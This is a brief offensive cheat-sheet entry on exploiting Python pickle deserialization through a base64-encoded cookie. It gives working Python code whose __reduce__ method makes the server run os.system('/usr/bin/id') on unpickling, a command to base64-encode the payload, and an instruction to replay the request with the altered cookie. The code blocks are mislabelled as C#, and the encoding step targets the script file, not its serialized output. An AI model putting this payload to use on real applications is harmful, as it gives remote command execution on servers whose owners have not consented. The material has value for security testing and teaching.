# Python Pickle

## Python Pickle

### base64 cookie

#### Create the following object and serialize it, then encode it with base64

```csharp
import _pickle as cPickle
import os

class Safe(object):
    def __reduce__(self):
        return (os.system,("/usr/bin/id",))

test = Safe()
bserial =  cPickle.dumps(test, 0).decode()
print(bserial)


```

```csharp
cat payload.py | base64 
```

* replay the request with the edited cookie value.

